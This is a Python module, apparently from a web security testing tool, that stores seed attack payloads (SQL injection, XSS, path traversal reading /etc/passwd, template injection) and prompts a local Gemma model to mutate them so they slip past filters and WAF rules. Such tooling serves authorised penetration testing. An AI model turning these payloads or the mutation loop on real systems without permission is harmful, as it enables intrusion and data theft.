"""
Payload Evolution Engine
========================
Memory-aware payload store with Gemma-assisted mutation.

Features:
- Store successful payloads with context
- Retrieve top payloads by type and success rate
- Ask Gemma to mutate/evolve payloads for new targets
"""

import httpx
import json
import os
import re
from typing import List, Optional
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy.future import select
from sqlalchemy import desc
from models import PayloadLibrary
from agents.utils import log_event

OLLAMA_BASE_URL = os.getenv("OLLAMA_BASE_URL", "http://127.0.0.1:11434")
OLLAMA_MODEL    = os.getenv("OLLAMA_MODEL", "gemma:2b")

# Seed payloads bootstrapped on first run
SEED_PAYLOADS = [
    # SQLi
    {"payload": "' OR '1'='1",             "vuln_type": "sqli",        "success_rate": 0.7},
    {"payload": "' OR 1=1--",              "vuln_type": "sqli",        "success_rate": 0.65},
    {"payload": "admin'--",                "vuln_type": "sqli",        "success_rate": 0.55},
    {"payload": "1 UNION SELECT null--",   "vuln_type": "sqli",        "success_rate": 0.5},
    # Auth bypass
    {"payload": "' OR 1=1#",              "vuln_type": "auth_bypass",  "success_rate": 0.6},
    {"payload": "admin",                  "vuln_type": "auth_bypass",  "success_rate": 0.4},
    # XSS
    {"payload": "<script>alert(1)</script>","vuln_type": "xss",        "success_rate": 0.6},
    {"payload": "\"><img src=x onerror=alert(1)>","vuln_type": "xss",  "success_rate": 0.55},
    # Path traversal
    {"payload": "../../etc/passwd",       "vuln_type": "path_traversal","success_rate": 0.5},
    {"payload": "..\\..\\windows\\system32\\drivers\\etc\\hosts",
                                          "vuln_type": "path_traversal","success_rate": 0.4},
    # SSTI
    {"payload": "${7*7}",                 "vuln_type": "ssti",         "success_rate": 0.5},
    {"payload": "{{7*7}}",               "vuln_type": "ssti",          "success_rate": 0.55},
]


class PayloadEngine:

    def __init__(self, session: AsyncSession):
        self.session = session

    async def seed(self):
        """Bootstrap PayloadLibrary with default payloads if empty."""
        count_res = await self.session.execute(select(PayloadLibrary))
        existing = count_res.scalars().all()
        if existing:
            return  # Already seeded

        for p in SEED_PAYLOADS:
            self.session.add(PayloadLibrary(
                payload=p["payload"],
                vuln_type=p["vuln_type"],
                success_rate=p["success_rate"],
                source="seed"
            ))
        await self.session.commit()

    async def get_best(self, vuln_type: str, limit: int = 10) -> List[str]:
        """Return top payloads for a given vulnerability type by success rate."""
        result = await self.session.execute(
            select(PayloadLibrary)
            .where(PayloadLibrary.vuln_type == vuln_type)
            .order_by(desc(PayloadLibrary.success_rate))
            .limit(limit)
        )
        return [r.payload for r in result.scalars().all()]

    async def evolve(self, vuln_type: str, tech_stack: str, context: str) -> List[str]:
        """Ask Gemma to mutate top payloads for a specific target context."""
        best = await self.get_best(vuln_type, limit=5)
        if not best:
            return []

        prompt = f"""You are a payload mutation engine for ethical security testing.

Given these existing {vuln_type} payloads:
{json.dumps(best, indent=2)}

Target context:
- Tech stack: {tech_stack}
- Context: {context}

Generate 5 new mutated variants that might bypass filters or WAF rules.
Respond ONLY as a JSON array of strings: ["payload1", "payload2", ...]"""

        try:
            async with httpx.AsyncClient(timeout=120.0) as client:
                r = await client.post(
                    f"{OLLAMA_BASE_URL}/api/generate",
                    json={"model": OLLAMA_MODEL, "prompt": prompt, "stream": False}
                )
                text = r.json().get("response", "")
                match = re.search(r'\[.*?\]', text, re.DOTALL)
                if match:
                    evolved = json.loads(match.group())
                    # Store evolved payloads
                    for p in evolved:
                        self.session.add(PayloadLibrary(
                            payload=str(p),
                            vuln_type=vuln_type,
                            success_rate=0.3,
                            source="gemma",
                            context=json.dumps({"tech": tech_stack, "ctx": context})
                        ))
                    await self.session.commit()
                    return evolved
        except Exception:
            pass
        return []

    async def record_success(self, payload: str, vuln_type: str, boost: float = 0.05):
        """Boost success rate of a payload that worked."""
        result = await self.session.execute(
            select(PayloadLibrary).where(
                PayloadLibrary.payload == payload,
                PayloadLibrary.vuln_type == vuln_type
            )
        )
        record = result.scalar_one_or_none()
        if record:
            record.success_rate = min(record.success_rate + boost, 1.0)
            record.used_count  += 1
            await self.session.commit()
